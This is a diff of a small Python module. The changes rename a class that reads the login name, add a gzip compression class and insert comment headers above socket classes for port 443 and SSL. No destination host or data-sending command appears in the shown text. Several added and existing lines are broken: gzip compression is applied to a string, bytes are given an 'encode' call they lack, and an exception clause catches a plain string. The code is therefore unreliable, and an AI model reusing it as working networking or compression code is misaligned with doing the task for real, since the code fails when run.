@@ -1,6 +1,9 @@
 import socket, gzip, ssl, os, syslog
 
-class DF_user:
+"""Get individual machine name"""
+
+
+class DFuserAuthorize:
 
     def __init__(self):
         self.user = os.getlogin()
@@ -10,6 +13,24 @@ class DF_user:
 
     def __del__(self):
         del self.user
+
+
+"""Data compresser"""
+
+
+class Cmprs:
+
+    def __init__(self, inp):
+        self.data = str(inp)
+
+    def cmprs(self):
+        return gzip.compress(self.data, compresslevel=9)
+
+    def __repr__(self):
+        return self.cmprs().encode()
+
+
+"""Open simple socket"""
 
 
 class Sock443:
@@ -33,6 +54,9 @@ class Sock443:
         del self.sock
         del self.port
         del self.addr
+
+
+"""Open SSL layer"""
 
 
 class SockSsl(Sock443):
@@ -65,7 +89,4 @@ class SockSsl(Sock443):
         except "sending error":
             self.ssl_sock.close()
             self.__del__()
-
-
-
 
